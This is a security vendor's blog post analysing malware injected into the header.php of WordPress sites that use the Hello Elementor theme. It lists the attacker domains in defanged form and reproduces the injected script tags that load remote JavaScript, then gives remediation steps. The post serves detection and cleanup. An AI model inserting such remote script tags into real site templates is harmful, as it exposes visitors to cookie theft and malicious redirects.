---
title: Malicious Script Injection on WordPress Sites
url: https://blog.sucuri.net/2024/12/malicious-script-injection-on-wordpress-sites.html
source: Over Security - Cybersecurity news aggregator
date: 2024-12-06
fetch_date: 2025-10-06T19:40:01.486581
---

# Malicious Script Injection on WordPress Sites

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Malicious Script Injection on WordPress Sites

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* December 5, 2024

![Malicious Script Injection on WordPress Sites](https://blog.sucuri.net/wp-content/uploads/2024/12/Malicious-Script-Injection-on-WordPress-Sites-820x385.png)

Recently, our team discovered a JavaScript-based malware affecting WordPress sites, primarily targeting those using the Hello Elementor theme. This type of malware is commonly embedded within legitimate-looking website files to load scripts from an external source. The malware injects a malicious external script into the theme’s **header.php** file, leading to harmful consequences for site owners and visitors.

![injected header script](https://blog.sucuri.net/wp-content/uploads/2024/12/header-injected-script.png)

Domains Involved:

* **spadeanalytica**[**.**]**com**
* **uph-analytics**[**.**]**com**
* **awebstats**[**.**]**com**

As of writing this article, 200+ websites are infected with this malware according to publicwww.com.

* <https://publicwww.com/websites/%22uph-analytics.com%22/>
* <https://publicwww.com/websites/%22spadeanalytica.com%22/>
* <https://publicwww.com/websites/%22awebstats.com%22/>

### Infection Details

The malware is injected into the **header.php** file with the following code snippet.

```
<script src="https://spadeanalytica[.]com/s/analytics.js"></script>
<script src="https://spadeanalytica[.]com/t/stat.js"></script>
```

[SiteCheck](https://sitecheck.sucuri.net/) detects these suspicious javascript codes as resources from a blacklisted domain.

![SiteCheck report](https://blog.sucuri.net/wp-content/uploads/2024/12/sitecheck-report.png)

### Why Does This Happen?

In most cases, malware like this gains entry through outdated themes, plugins, or weak security practices. In this instance, the code is embedded within the theme’s **header.php** file. Attackers target core theme files since they load on every page and make an effective vector to propagate malicious behavior.

### Why Is This Dangerous?

The injected script from an untrusted domain enables the attacker to control aspects of the website’s functionality, leading to issues such as:

* Stealing user information, including session data and cookies.
* Redirecting users to ad networks or spam sites, damaging site credibility.
* It can also affect a site’s SEO ranking. Sites flagged with malicious scripts can face penalties from search engines, reducing visibility and affecting traffic.

### Remediation Steps

* Manually remove any unauthorized script tags referencing suspicious domains from **header.php**.
* Ensure your WordPress themes, plugins, and core files are up to date to prevent vulnerability exploits.
* Regularly scan your website with [SiteCheck](https://sitecheck.sucuri.net/) or another security tool to catch any malware early.
* Disable file editing in your WordPress configuration (**wp-config.php**) by adding `define('DISALLOW_FILE_EDIT', true);` to reduce the risk of unauthorized changes.
* Consider additional security measures like two-factor authentication, secure passwords, and strict user roles to [harden your WordPress security](https://blog.sucuri.net/2023/07/how-to-harden-wordpress-a-basic-overview.html) further.

[![Chat now](https://blog.sucuri.net/wp-content/uploads/2022/02/Sucuri_1390x466_Chat-With-Us_CTA-Image_v8-Multi-site.png)](https://sucuri.net/live-chat/)

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=120&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

##### [Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

Puja Srivastava is a Security Analyst with a passion for fighting new and undetected malware threats. With over 7 years of experience in the field of malware research and security, Puja has honed her skills in detecting, monitoring, and cleaning malware from websites. Her responsibilities include website malware remediation, training, cross-training and mentoring new recruits and analysts from other departments, and handling escalations. Outside of work, Puja enjoys exploring new places and cuisines, experimenting with new recipes in the kitchen, and playing chess.

##### Related Tags

* [Malware](https://blog.sucuri.net/tag/malware),
* [WordPress Security](https://blog.sucuri.net/tag/wordpress-security)

##### Related Categories

* [We...